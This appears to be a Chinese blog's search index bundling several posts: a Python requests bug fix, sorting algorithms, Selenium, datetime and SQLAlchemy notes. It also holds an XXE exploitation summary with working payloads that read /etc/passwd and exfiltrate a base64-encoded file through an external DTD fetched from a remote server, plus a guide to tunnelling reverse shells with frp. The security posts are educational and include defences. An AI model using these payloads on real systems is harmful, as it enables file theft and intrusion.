    <content type="text"><![CDATA[得之坦然，失之淡然，顺其自然，争其必然 fix一个requests redirect bug 起因在我请求某个链接的时候，requests抛出了如下异常（我是python3环境）：12345678910111213141516171819202122Traceback (most recent call last): File "F:\python\python36\lib\site-packages\IPython\core\interactiveshell.py", line 2910, in run_code exec(code_obj, self.user_global_ns, self.user_ns) File "&lt;ipython-input-8-36f4e5f02f7e&gt;", line 1, in &lt;module&gt; resp = requests.get('http://xxx.com/xxx') File "F:\python\python36\lib\site-packages\requests\api.py", line 72, in get return request('get', url, params=params, **kwargs) File "F:\python\python36\lib\site-packages\requests\api.py", line 58, in request return session.request(method=method, url=url, **kwargs) File "F:\python\python36\lib\site-packages\requests\sessions.py", line 512, in request resp = self.send(prep, **send_kwargs) File "F:\python\python36\lib\site-packages\requests\sessions.py", line 644, in send history = [resp for resp in gen] if allow_redirects else [] File "F:\python\python36\lib\site-packages\requests\sessions.py", line 644, in &lt;listcomp&gt; history = [resp for resp in gen] if allow_redirects else [] File "F:\python\python36\lib\site-packages\requests\sessions.py", line 124, in resolve_redirects url = self.get_redirect_target(resp) File "F:\python\python36\lib\site-packages\requests\sessions.py", line 115, in get_redirect_target return to_native_string(location, 'utf8') File "F:\python\python36\lib\site-packages\requests\_internal_utils.py", line 25, in to_native_string out = string.decode(encoding)UnicodeDecodeError: 'utf-8' codec can't decode byte 0xc7 in position 45: invalid continuation byte 看错误信息应该是重定向了，并且requests无法正常解码location字段 通过抓包看请求，发现重定向链接含有非ascii字符: 可以看到含有非ascii字符，且编码是gbk 分析根据上面报错信息，查看requests\sessions.py的get_redirect_target函数的解码部分和： 123456789101112if resp.is_redirect: location = resp.headers['location'] # Currently the underlying http module on py3 decode headers # in latin1, but empirical evidence suggests that latin1 is very # rarely used with non-ASCII characters in HTTP headers. # It is more likely to get UTF8 header rather than latin1. # This causes incorrect handling of UTF8 encoded location headers. # To solve this, we re-encode the location in latin1. if is_py3: location = location.encode('latin1') return to_native_string(location, 'utf8')return None 如果是python3，那么先使用latin1加密一次，接着调用了to_native_string，默认的就是’utf-8’，而最终的错误回溯也是在这里： 123456789if isinstance(string, builtin_str): out = stringelse: if is_py2: out = string.encode(encoding) else: out = string.decode(encoding)return out 如果是python3，会解码，encoding就是’utf-8’。 但是我的重定向链接编码不是utf-8而是gbk，所以无法正常解码。 解决我的解决办法是对session的get_redirect_target方法做了patch： 123456789101112131415161718import requestsfrom requests._internal_utils import to_native_stringfrom requests.compat import is_py3def get_redirect_target(self, resp): """hook requests.Session.get_redirect_target method""" if resp.is_redirect: location = resp.headers['location'] if is_py3: location = location.encode('latin1') encoding = resp.encoding if resp.encoding else 'utf-8' return to_native_string(location, encoding) return Nonedef patch(): requests.Session.get_redirect_target = get_redirect_target 其他地方需要patch的，直接在使用requests请求之前调用patch方法就行了]]></content>
  </entry>
  <entry>
    <title><![CDATA[xxe漏洞利用总结]]></title>
    <url>%2Fxxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93.html</url>
    <content type="text"><![CDATA[今天很残酷,明天也一样,后天也许还是一样,但你不得不经过明天后天 最近遇到了关于xxe相关漏洞，于是想做个总结，方便以后查阅。 XML基础XML文档结构XML文档结构包括XML声明、DTD文档类型定义（可选,可选是因为类型定义是加强约束,对于漏洞利用来说可以不定义）、文档元素。 1234567891011121314151617&lt;!--XML申明--&gt;&lt;?xml version="1.0"?&gt; &lt;!--文档类型定义--&gt;&lt;!DOCTYPE note [ &lt;!--定义此文档是 note 类型的文档--&gt;&lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!--定义note元素有四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt; &lt;!--定义to元素为”#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt; &lt;!--定义from元素为”#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt; &lt;!--定义head元素为”#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt; &lt;!--定义body元素为”#PCDATA”类型--&gt;]&gt;&lt;!--文档元素--&gt;&lt;note&gt;&lt;to&gt;Dave&lt;/to&gt;&lt;from&gt;Tom&lt;/from&gt;&lt;head&gt;Reminder&lt;/head&gt;&lt;body&gt;You are a good man&lt;/body&gt;&lt;/note&gt; DTD文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。 内部声明DTD:&lt;!DOCTYPE 根元素 [元素声明]&gt; 引用外部DTD:&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt; DTD文档中有很多重要的关键字如下: DOCTYPE（DTD的声明） ENTITY（实体的声明） SYSTEM、PUBLIC（外部资源申请） 实体实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。实体按类型主要分为以下四种： 内置实体 (Built-in entities) 字符实体 (Character entities) 通用实体 (General entities) 参数实体 (Parameter entities)实体根据引用方式，还可分为内部实体与外部实体。完整的实体类别可参考 DTD - Entities 实体类别内部实体：1&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt; 外部实体：1&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt; 参数实体：123&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;或者&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt; 参数实体用% 实体名称申明，引用时也用% 实体名称;其余实体直接用实体名称申明，引用时用&amp; 实体名称。参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。 实例演示内部实体：123456&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY name "longofo"&gt;]&gt;&lt;foo&gt; &lt;value&gt;&amp;name;&lt;/value&gt; &lt;/foo&gt; php测试：123456789101112131415161718&lt;?php$xml = '&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY name "longofo"&gt;]&gt;&lt;foo&gt; &lt;value&gt;&amp;name;&lt;/value&gt; &lt;/foo&gt;';try&#123; //注意在php新版本中需要加SimpleXMLElement和LIBXML_NOENT才能复现成功。 $doc = simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT); var_dump($doc); echo '&lt;br/&gt;'; echo $doc-&gt;vaule;&#125;catch(Exception $e)&#123; echo "error";&#125;?&gt; 外部实体：1234567&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY name SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;foo&gt; &lt;value&gt;&amp;name;&lt;/value&gt;&lt;/foo&gt; php测试：12345678910111213141516171819&lt;?php$xml = '&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY name SYSTEM "file:///C:/Users/dell/Desktop/xxe.txt"&gt;]&gt;&lt;foo&gt; &lt;value&gt;&amp;name;&lt;/value&gt;&lt;/foo&gt;';try&#123; //注意在php新版本中需要加SimpleXMLElement和LIBXML_NOENT才能复现成功。 $doc = simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT); var_dump($doc); echo '&lt;br/&gt;'; echo $doc-&gt;value;&#125;catch(Exception $e)&#123; echo "error";&#125;?&gt; 参数实体：12345678&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY % file SYSTEM "http://127.0.0.1:8088/Desktop/xxe.dtd"&gt; %file;]&gt;&lt;foo&gt; &lt;value&gt;&amp;name;&lt;/vaule&gt;&lt;/foo&gt; xxe.dtd内容：为了进行测试可以简单使用python启动一个服务器：1python -m SimpleHTTPServer 8088 php测试：1234567891011121314151617181920&lt;?php$xml = '&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY % file SYSTEM "http://10.1.8.35:8088/Desktop/xxe.dtd"&gt; %file;]&gt;&lt;foo&gt; &lt;value&gt;&amp;name;&lt;/value&gt;&lt;/foo&gt;';try&#123; //注意在php新版本中需要加SimpleXMLElement和LIBXML_NOENT才能复现成功。 $doc = simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT); var_dump($doc); echo '&lt;br/&gt;'; echo $doc-&gt;value;&#125;catch(Exception $e)&#123; echo "error";&#125;?&gt; 注意：%name（参数实体）是在DTD中被引用的，而&amp;name（其余实体）是在xml文档中被引用的。 由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。 外部实体支持的协议类型外部实体即在DTD中使用1&lt;!ENTITY 实体名称 SYSTEM "URI"&gt; 语法引用外部的实体，而非内部实体，那么URL中能写哪些类型的外部实体呢？主要的有file、http、https、ftp等等，不同的程序支持的不一样： libxml2 PHP JAVA .NET file file http file http http https http ftp ftp ftp https php file ftp compress.zlib jar compress.bzip2 netdoc data mailto glob gopher * phar http xxe漏洞利用与防范有回显利用方式和上面的演示类似 无回显测试代码：123456789101112131415&lt;?php$xml = '&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=C:/Users/dell/Desktop/xxe.txt"&gt; &lt;!ENTITY % dtd SYSTEM "http://10.1.8.35:8088/Desktop/xxe.dtd"&gt;%dtd;%send;]&gt;';try&#123; $doc = simplexml_load_string($xml,'SimpleXMLElement',LIBXML_NOENT);&#125;catch(Exception $e)&#123; echo "error";&#125;?&gt; xxe.dtd内容：为了测试成功，可以使用python开启一个http服务器1python -m SimpleHTTPServer 8088 服务器请求log： 注：xxe的利用姿势以及绕过防御姿势有很多，这里不再一一介绍了 xxe可以用来做什么？当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。 防御XXE攻击使用开发语言提供的禁用外部实体的方法PHP：libxml_disable_entity_loader(true); 其他语言:https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet 过滤用户提交的XML数据关键词：SYSTEM和PUBLIC等。 参考 https://security.tencent.com/index.php/blog/msg/69 http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf https://www.youtube.com/watch?v=j2cfebNEfic]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>xxe</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[frp实现内网穿透-内网kali接收反弹shell]]></title>
    <url>%2Ffrp%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F-%E5%86%85%E7%BD%91kali%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%BC%B9shell.html</url>
    <content type="text"><![CDATA[总有一段路，需要一个人走，那就一个人，勇敢的走完 前言公网没有kali主机，且kali处于多层内网，而且不能控制路由器添加端口映射，kali该如何接收反弹式shell?可以使用内网穿透工具，下面使用frp演示. 准备 kali机 外网服务器 根据自己的操作系统选择frp 配置服务器配置:服务器运行: kali配置:kali运行: 看服务端控制台输出:kali连接到了服务端，服务端监听了4444端口，这样访问服务端就能访问到kali了。 注:[kali]的配置type=tcp是因为下面的payload使用的是reverse_tcp注:上面的配置不安全，详细配置请看https://github.com/fatedier/frp/blob/master/conf/frps_full.ini 攻击验证frp有效性攻击环境: kali上运行:监听4444端口 目标机通过上图红色线反弹shell给kali：]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>内网穿透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python实现八大排序]]></title>
    <url>%2Fpython%E5%AE%9E%E7%8E%B0%E5%85%AB%E5%A4%A7%E6%8E%92%E5%BA%8F.html</url>
    <content type="text"><![CDATA[世界这么大,该往哪走? python实现八大排序 直接插入排序算法基本思想: 直接插入排序(Straight Insertion Sort)的基本思想是：把n个待排序的元素看成为一个有序表和一个无序表。开始时有序表中只包含1个元素，无序表中包含有n-1个元素，排序过程中每次从无序表中取出第一个元素，将它插入到有序表中的适当位置，使之成为新的有序表，重复n-1次可完成排序过程。 123456789101112131415161718192021222324252627282930313233def insert_sort(iterable, reverse=False): ''' 对可迭代对象进行插入排序 args: iterable: 可迭代对象 reversed: False默认从小到大排序。True从大到小 ''' for i, _ in enumerate(iterable): for j in range(i, 0, -1): if iterable[j] &lt; iterable[j - 1]: iterable[j], iterable[j - 1] = iterable[j - 1], iterable[j] else: break if reverse: iterable.reverse()if __name__ == '__main__': lst1 = [3, 10, 4, 8, 1, 20, 100] lst2 = [1] lst3 = [] lst4 = lst1[::] insert_sort(lst1) print(lst1) insert_sort(lst2) print(lst2) insert_sort(lst3) print(lst3) insert_sort(lst4, reverse=True) print(lst4) 希尔排序算法基本思想: 希尔排序是把记录按下标的一定增量分组，对每组使用直接插入排序算法排序；随着增量逐渐减少，每组包含的关键词越来越多，当增量减至1时，整个文件恰被分成一组，算法便终止。 1234567891011121314151617181920212223242526272829303132333435363738394041424344ddef shell_insert(iterable, start, end, step): for i in range(start, end, step): for j in range(i, start, -step): if iterable[j] &lt; iterable[j - step]: iterable[j], iterable[j - step] = iterable[j - step], iterable[j] else: breakdef shell_sort(iterable, reverse=False): ''' 对可迭代对象进行希尔排序 args: iterable: 可迭代对象 reversed: False默认从小到大排序。True从大到小 ''' length = len(iterable) gap = length // 2 while gap != 0: for start in range(gap + 1): shell_insert(iterable, start, length, gap) gap = gap // 2 if reverse: iterable.reverse()if __name__ == '__main__': lst1 = [3, 10, 4, 8, 1, 20, 100] lst2 = [1] lst3 = [] lst4 = lst1[::] shell_sort(lst1) print(lst1) shell_sort(lst2) print(lst2) shell_sort(lst3) print(lst3) shell_sort(lst4, reverse=True) print(lst4) 直接选择排序算法基本思想: 与直接插入排序一样，分为有序区和无序区，所不同的是直接播放排序是将无序区的第一个元素直接插入到有序区以形成一个更大的有序区，而直接选择排序是从无序区选一个最小的元素直接放到有序区的最后。 123456789101112131415161718192021222324252627282930313233343536373839def select_sort(iterable, reverse=False): ''' 对可迭代对象进行直接选择排序 args: iterable: 可迭代对象 reversed: False默认从小到大排序。True从大到小 ''' length = len(iterable) for i in range(length): min_x = iterable[i] flag_x = i for j in range(i + 1, length): if iterable[j] &lt; min_x: min_x = iterable[j] flag_x = j iterable[i], iterable[flag_x] = iterable[flag_x], iterable[i] print(iterable) if reverse: iterable.reverse()if __name__ == '__main__': lst1 = [3, 10, 4, 8, 1, 20, 100] lst2 = [1] lst3 = [] lst4 = lst1[::] select_sort(lst1) print(lst1) select_sort(lst2) print(lst2) select_sort(lst3) print(lst3) select_sort(lst4, reverse=True) print(lst4) 堆排序算法基本思想(大顶堆为例): 先将初始排列关键字序列(R1,R2…,Rn-1,Rn)构成大顶堆，此堆为初始的无序区.(这里是从最后一个非叶结点向前进行赛选) 将堆顶元素R1与最后一个元素Rn交换，此时得到新的无序区(R1,R2…,Rn-1)和新的有序区(Rn)，并且Rn大于无序区所有数，此后还有n-1个数； 由于交换后新的堆顶R1可能违反堆的性质，因此需要对当前无序区(R1,R2…,Rn-1)调整为新堆(将堆顶元素向下调整使其保持大顶堆的性质，输出堆顶元素)，此后还剩余n-2个数； 重读以上算法，直到堆中仅剩一个元素为止. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273class HeapSort(object): ''' 堆排序 set() 方法设置可迭代对象以及排列顺序 _sift_down() 进行向下调整堆 _create_heap() 创建初始堆 heap_sort() 进行堆排序 ''' def set(self, iterable, reverse=False): self.iterable = iterable self.reverse = reverse self.length = len(iterable) self.iterable.insert(0, None) def _sift_down(self, index): left_child, right_child = index * 2, index * 2 + 1 if left_child &gt; self.cur_len: return max_child = left_child if (right_child &lt;= self.cur_len) and (self.iterable[left_child] &lt; self.iterable[right_child]): max_child = right_child if self.iterable[index] &lt; self.iterable[max_child]: self.iterable[index], self.iterable[max_child] = self.iterable[max_child], self.iterable[index] self._sift_down(max_child) def _create_heap(self): for i in range(self.length // 2, 0, -1): self._sift_down(i) def heap_sort(self): # cur_len表示还没有顺序区域的长度 self.cur_len = self.length self._create_heap() while self.cur_len: # print(self.iterable) self.iterable[1], self.iterable[self.cur_len] = self.iterable[self.cur_len], self.iterable[1] self.cur_len -= 1 self._sift_down(1) self.iterable.pop(0) if self.reverse: self.iterable.reverse()if __name__ == '__main__': lst1 = [3, 10, 4, 8, 1, 20, 100] lst2 = [1] lst3 = [] lst4 = lst1[::] heap_sort = HeapSort() heap_sort.set(lst1) heap_sort.heap_sort() print(lst1) heap_sort.set(lst2) heap_sort.heap_sort() print(lst2) heap_sort.set(lst3) heap_sort.heap_sort() print(lst3) heap_sort.set(lst4, reverse=True) heap_sort.heap_sort() print(lst4) 冒泡排序算法基本思想: 从无序序列头部开始，进行两两比较，根据大小交换位置，直到最后将最大（小）的数据元素交换到了无序队列的队尾，从而成为有序序列的一部分；下一次继续这个过程，直到所有数据元素都排好序。 123456789101112131415161718192021222324252627282930313233343536373839def bubble_sort(iterable, reverse=False): ''' 冒泡排序 args: iterable: 可迭代对象 reversed: False默认从小到大排序。True从大到小 ''' length = len(iterable) for i in range(length, 0, -1): # flag标记本次是否交换了数据,如果没交换数据就不用继续排了 flag = 0 for j in range(i - 1): if iterable[j] &gt; iterable[j + 1]: iterable[j], iterable[j + 1] = iterable[j + 1], iterable[j] flag = 1 if not flag: break if reverse: iterable.reverse()if __name__ == '__main__': lst1 = [3, 10, 4, 8, 1, 20, 100] lst2 = [1] lst3 = [] lst4 = lst1[::] bubble_sort(lst1) print(lst1) bubble_sort(lst2) print(lst2) bubble_sort(lst3) print(lst3) bubble_sort(lst4, reverse=True) print(lst4) 快速排序算法基本思想(分治思想): 在数据集之中，找一个基准点(以下代码以最left为基准点) 以基准点为中心将数据分为左边比基准点小,右边大于等于基准点 在递归左右两边 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364class QuickSort(object): ''' 快速排序 set() 设置可迭代对象及排序方式(大-&gt;小 or 小-&gt;大) place_it() 每次选择最左边的作为参考,这个方法调用后左边的元素都小于它，右边的元素大于等于它,返回参考元素最终的位置 sort() 递归左右两边 ''' def set(self, iterable, reverse=False): self.iterable = iterable self.reverse = reverse def place_it(self, left, right): chose_it = left while left &lt; right: while left &lt; right: if self.iterable[right] &lt; self.iterable[chose_it]: break right -= 1 while left &lt; right: if self.iterable[left] &gt; self.iterable[chose_it]: break left += 1 self.iterable[left], self.iterable[right] = self.iterable[right], self.iterable[left] self.iterable[left], self.iterable[chose_it] = self.iterable[chose_it], self.iterable[left] return left def sort(self, left, right): if left &gt;= right: return index = self.place_it(left, right) # print(self.iterable) self.sort(left, index - 1) self.sort(index + 1, right) def quick_sort(self): self.sort(0, len(self.iterable) - 1) if self.reverse: self.iterable.reverse()if __name__ == '__main__': lst1 = [3, 10, 4, 8, 1, 20, 100, 8, 101, 0, 35, 9, 10, 100, 20, 2, 3] lst2 = [1] lst3 = [] lst4 = lst1[::] quick_sort = QuickSort() quick_sort.set(lst1) quick_sort.quick_sort() print(lst1) quick_sort.set(lst2) quick_sort.quick_sort() print(lst2) quick_sort.set(lst3) quick_sort.quick_sort() print(lst3) quick_sort.set(lst4, reverse=True) quick_sort.quick_sort() print(lst4) 归并排序算法基本思想(分治思想): 归并排序首先将待排序数组或线性表分为两个有序数组或线性表 将两个有序数组或线性表合并成一个有序数组或线性表. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980class MergeSort(object): ''' 归并排序 set() 设置可迭代对象及排序方式(大-&gt;小 or 小-&gt;大) merge() 将有序的两边进行合并 sort() 递归左右两边 ''' def set(self, iterable, reverse=False): self.iterable = iterable self.reverse = reverse def merge(self, left, mid, right): ''' 合并左右两边 ''' left_index = left right_index = mid + 1 left_end = mid right_end = right tmp = [] while left_index &lt;= left_end and right_index &lt;= right_end: if self.iterable[left_index] &lt;= self.iterable[right_index]: tmp.append(self.iterable[left_index]) left_index += 1 else: tmp.append(self.iterable[right_index]) right_index += 1 while left_index &lt;= left_end: tmp.append(self.iterable[left_index]) left_index += 1 while right_index &lt;= right_end: tmp.append(self.iterable[right_index]) right_index += 1 tmp_index = 0 for i in range(left, right + 1): self.iterable[i] = tmp[tmp_index] tmp_index += 1 def sort(self, left, right): if left &gt;= right: return mid = (left + right) // 2 self.sort(left, mid) self.sort(mid + 1, right) self.merge(left, mid, right) def merge_sort(self): self.sort(0, len(self.iterable) - 1) if self.reverse: self.iterable.reverse()if __name__ == '__main__': lst1 = [3, 10, 4, 8, 1, 20, 100, 8, 101, 0, 35, 9, 10, 100, 20, 2, 3] lst2 = [1] lst3 = [] lst4 = lst1[::] merge_sort = MergeSort() merge_sort.set(lst1) merge_sort.merge_sort() print(lst1) merge_sort.set(lst2) merge_sort.merge_sort() print(lst2) merge_sort.set(lst3) merge_sort.merge_sort() print(lst3) merge_sort.set(lst4, reverse=True) merge_sort.merge_sort() print(lst4) 基数排序后面再补…]]></content>
      <categories>
        <category>算法</category>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[selenium实现动态切换ip]]></title>
    <url>%2Fselenium%E5%AE%9E%E7%8E%B0%E5%8A%A8%E6%80%81%E5%88%87%E6%8D%A2ip.html</url>
    <content type="text"><![CDATA[就算回报远少于付出,那也还是得努力,不努力真的连一点回报都没有 selenium动态切换ip selenium切换ip切换demo如下: 1234567891011121314151617181920212223from selenium import webdrivertry: browser = webdriver.Chrome() browser.get('http://httpbin.org/ip') print('1: ', browser.session_id) print('2: ', browser.page_source) print('3: ', browser.get_cookies()) # 利用DesiredCapabilities(代理设置)参数值，重新打开一个sessionId，我看意思就相当于浏览器清空缓存后，加上代理重新访问一次url proxy = webdriver.Proxy() proxy.http_proxy = '127.0.0.1:1080' # 将代理设置添加到webdriver.DesiredCapabilities.PHANTOMJS中 proxy.add_to_capabilities(webdriver.DesiredCapabilities.CHROME) browser.start_session(webdriver.DesiredCapabilities.CHROME) browser.get('http://httpbin.org/ip') print('1: ', browser.session_id) print('2: ', browser.page_source) print('3: ', browser.get_cookies())except Exception as e: print(e.args)finally: browser.quit()]]></content>
      <categories>
        <category>selenium</category>
      </categories>
      <tags>
        <tag>selenium</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[datetime与string、timetuple、timestamp之间的转换]]></title>
    <url>%2Fdatetime%E4%B8%8Estring%E3%80%81timetuple%E3%80%81timestamp%E4%B9%8B%E9%97%B4%E7%9A%84%E8%BD%AC%E6%8D%A2.html</url>
    <content type="text"><![CDATA[生命有限，请浪费在更美好的事物上。 datetime经常要与string、timestamp进行转换,记录下以前的笔记,忘记时可以翻看 datetime&lt;=&gt;string12345678# %Y:年 %m:月 %d:日 %H:小时 %M:分钟 % S:秒# datetime-&gt;string&gt;&gt;&gt; datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')'2018-07-03 13:49:26'# string-&gt;datetime&gt;&gt;&gt; datetime.datetime.strptime('2018-07-03 13:49:26','%Y-%m-%d %H:%M:%S')datetime.datetime(2018, 7, 3, 13, 49, 26) datetime&lt;=&gt;timetuple123456789101112# datetime-&gt;timetuple&gt;&gt;&gt; timetuple = datetime.datetime.now().timetuple()&gt;&gt;&gt; timetupletime.struct_time(tm_year=2018, tm_mon=7, tm_mday=3, tm_hour=13, tm_min=57, tm_sec=1, tm_wday=1, tm_yday=184, tm_isdst=-1)# timetuple-&gt;datetime&gt;&gt;&gt; timestamp = time.mktime(timetuple)&gt;&gt;&gt; timestamp1530597421.0&gt;&gt;&gt; tm = datetime.datetime.fromtimestamp(timestamp)&gt;&gt;&gt; tmdatetime.datetime(2018, 7, 3, 13, 57, 1) datetime&lt;=&gt;timestamp12345678910# datetime-&gt;timestamp&gt;&gt;&gt; timestamp = datetime.datetime.now().timestamp()&gt;&gt;&gt; timestamp1530597698.058432# timestamp-&gt;datetime&gt;&gt;&gt; tm = datetime.datetime.fromtimestamp(timestamp)&gt;&gt;&gt; tmdatetime.datetime(2018, 7, 3, 14, 1, 38, 58432)&gt;&gt;&gt;]]></content>
      <categories>
        <category>python</category>
        <category>datetime</category>
      </categories>
      <tags>
        <tag>datetime</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlaLchemy--ORM常见操作]]></title>
    <url>%2FsqlaLchemy--ORM%E5%B8%B8%E8%A7%81%E6%93%8D%E4%BD%9C.html</url>
    <content type="text"><![CDATA[不做就别做，要做就坚持下去 记录下sqlalchemy中常用的操作，其它很多框架的ORM也是对sqlalchemy的包装，因此这些方法在框架中也是可用的 后面代码中使用的模型1234567891011121314151617181920212223242526272829303132333435from sqlalchemy import create_engine, Column, Integer, String, ForeignKeyfrom sqlalchemy.orm import relationship, sessionmakerfrom sqlalchemy.ext.declarative import declarative_baseengine = create_engine('mysql://root:123456@127.0.0.1:3306/test1?charset=utf8')Base = declarative_base()class User(Base): __tablename__ = 'users' id = Column(Integer, primary_key=True) name = Column(String(100)) fullname = Column(String(100)) password = Column(String(100)) addresses = relationship("Address", backref="user",cascade="all, delete, delete-orphan") def __repr__(self): return "&lt;User(name='%s', fullname='%s', password='%s')&gt;" % ( self.name, self.fullname, self.password)class Address(Base): __tablename__ = 'addresses' id = Column(Integer, primary_key=True) email_address = Column(String(100), nullable=False) user_id = Column(Integer, ForeignKey('users.id')) def __repr__(self): return "&lt;Address(email_address='%s')&gt;" % self.email_addressBase.metadata.create_all(engine)Session = sessionmaker(bind=engine)session = Session() 添加/更新/删除对象添加对象123456789101112131415&gt;&gt;&gt; wu_user = User(name='wu',fullname='wu xxx xxxx',password='abcdef')&gt;&gt;&gt; session.add(wu_user)&gt;&gt;&gt; user = session.query(User).filter_by(name='wu').first()&gt;&gt;&gt; user&lt;User(name='wu', fullname='wu xxx xxxx', password='abcdef')&gt;&gt;&gt;&gt; wu_user is userTrue&gt;&gt;&gt; user.name'wu'&gt;&gt;&gt; user.fullname'wu xxx xxxx'&gt;&gt;&gt; user.password'abcdef'&gt;&gt;&gt; session.commit()&gt;&gt;&gt; 更新对象1234567&gt;&gt;&gt; wu_user.name = 'wu wu'&gt;&gt;&gt; session.add(wu_user)&gt;&gt;&gt; session.commit()&gt;&gt;&gt; user = session.query(User).filter_by(name='wu wu').first()&gt;&gt;&gt; user&lt;User(name='wu wu', fullname='wu xxx xxxx', password='abcdef')&gt;&gt;&gt;&gt; 删除12session.delete(jack)session.commit() 查询 基本查询 123456789&gt;&gt;&gt; for instance in session.query(User).order_by(User.id): print(instance.name, instance.fullname)wu wu wu xxx xxxxhu hu xxx xxxxqi qi xxx xxxxhg hg xxx xxxx&gt;&gt;&gt; print(str(session.query(User).order_by(User.id))) # 可以通过str查看执行的sql语句SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password FROM users ORDER BY users.id 可以直接指定要查询的字段，此时查询返回的是一个KeyedTuple对象，可以当做元组那样对待: 123456&gt;&gt;&gt; for name, fullname in session.query(User.name, User.fullname): print(name, fullname)wu wu wu xxx xxxxhu hu xxx xxxxqi qi xxx xxxxhg hg xxx xxxx 通过lable为字段命别名: 12345678910&gt;&gt;&gt; for row in session.query(User.name.label('name_label')).all(): print(row.name_label)wu wuhuqihg&gt;&gt;&gt; print(str(session.query(User.name.label('name_label'))))SELECT users.name AS name_label FROM users&gt;&gt;&gt; aliased为实体命别名: 1234567891011&gt;&gt;&gt; from sqlalchemy.orm import aliased&gt;&gt;&gt; user_alias = aliased(User, name='user_alias')&gt;&gt;&gt; for row in session.query(user_alias, user_alias.name).all(): print(row.user_alias)&lt;User(name='wu wu', fullname='wu xxx xxxx', password='abcdef')&gt;&lt;User(name='hu', fullname='hu xxx xxxx', password='abcdef')&gt;&lt;User(name='qi', fullname='qi xxx xxxx', password='abcdef')&gt;&lt;User(name='hg', fullname='hg xxx xxxx', password='abcdef')&gt;&gt;&gt;&gt; print(str(session.query(user_alias, user_alias.name)))SELECT user_alias.id AS user_alias_id, user_alias.name AS user_alias_name, user_alias.fullname AS user_alias_fullname, user_alias.password AS user_alias_password FROM users AS user_alias limit offset 指定偏移和结果数目 123456&gt;&gt;&gt; session.query(User).order_by(User.id).limit(2).offset(1).all()[&lt;User(name='hu', fullname='hu xxx xxxx', password='abcdef')&gt;, &lt;User(name='qi', fullname='qi xxx xxxx', password='abcdef')&gt;]&gt;&gt;&gt; print(str(session.query(User).order_by(User.id).limit(2).offset(1)))SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password FROM users ORDER BY users.id LIMIT %s, %s Query对象是完全生成的，他返回的是一个新的Query对象，可继续使用查询语句 1234567891011&gt;&gt;&gt; for user in session.query(User).\ filter(User.name=='hu').\ filter(User.fullname=='hu xxx xxxx'): print(user) &lt;User(name='hu', fullname='hu xxx xxxx', password='abcdef')&gt;&gt;&gt;&gt; print(str(session.query(User).filter(User.name=='hu').filter(User.fullname=='hu xxx xxxx')))SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password FROM users WHERE users.name = %s AND users.fullname = %s 过滤 equals/not equals 123456789101112131415# euqals&gt;&gt;&gt; session.query(User).filter(User.name == 'wu wu').first()&lt;User(name='wu wu', fullname='wu xxx xxxx', password='abcdef')&gt;&gt;&gt;&gt; print(str(session.query(User).filter(User.name == 'wu wu')))SELECT users.id AS users_id, users.name AS users_name, users.fullname AS users_fullname, users.password AS users_password FROM users WHERE users.name = %s# not equals&gt;&gt;&gt; session.query(User).filter(User.name != 'wu wu').all()[&lt;User(name='hu', fullname='hu xxx xxxx', password='abcdef')&gt;, &lt;User(name='qi', fullname='qi xxx xxxx', 